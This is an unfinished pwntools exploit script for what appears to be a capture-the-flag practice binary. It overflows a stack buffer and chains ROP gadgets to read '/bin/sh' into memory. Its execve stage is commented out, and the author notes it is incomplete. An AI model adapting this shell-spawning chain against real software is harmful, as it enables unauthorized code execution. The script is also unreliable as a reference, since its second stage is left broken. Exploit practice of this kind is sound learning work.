# Wasn't able to complete this

from pwn import *

pop_rdi = 0x00000000004018ca
pop_rdx = 0x00000000004017cf
pop_rsi_r15 = 0x00000000004018c8
pop_rax = 0x00000000004494a7
bin_sh = b'/bin/sh\0'
bs_segment = 0x004c2240

p = process('./chall_14')

payload = b'A'*264
payload += p64(pop_rdi) + p64(0x0)
payload += p64(pop_rsi_r15) + p64(bs_segment) + p64(0x0)
payload += p64(pop_rdx) + p64(len(bin_sh) + 1)
payload += p64(pop_rax) + p64(0x0)
payload += p64(p.elf.sym['read'])

p.sendline(payload)
p.sendline(bin_sh)

#payload2 = p64(pop_rax) + p64(0x3b) 
#payload += p64(pop_rdi) + p64(bs_segment) 

#p.sendline(payload2)
p.interactive()
